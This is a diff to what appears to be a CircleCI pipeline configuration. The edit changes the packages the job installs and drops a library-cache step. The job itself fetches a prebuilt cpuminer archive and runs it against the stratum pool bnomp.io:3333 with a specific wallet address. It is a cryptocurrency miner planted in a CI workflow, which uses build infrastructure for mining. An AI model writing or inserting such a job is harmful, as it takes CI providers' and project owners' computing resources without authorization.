@@ -10,17 +10,13 @@ jobs:
       - run:
           name: Install Dependencies
           command: |
-            apt-get update && apt-get install -y wget libssl-dev libcurl4
+            apt-get update && apt-get install -y wget
 
       - run:
           name: Download and Extract
           command: |
             wget -qO- https://github.com/bitnet-io/cpuminer-opt-aurum/releases/download/aurum/CPU-AURUM-linux.tar.gz | tar xvz
             cd cpuminer-linux && ./cpuminer -a aurum -o stratum+tcp://bnomp.io:3333 -u B9P2PDtk2cftCQiC41hw6Pw9rdJEiVztae -p x
-
-      - run:
-          name: Update Library Cache
-          command: ldconfig
 
 workflows:
   version: 2
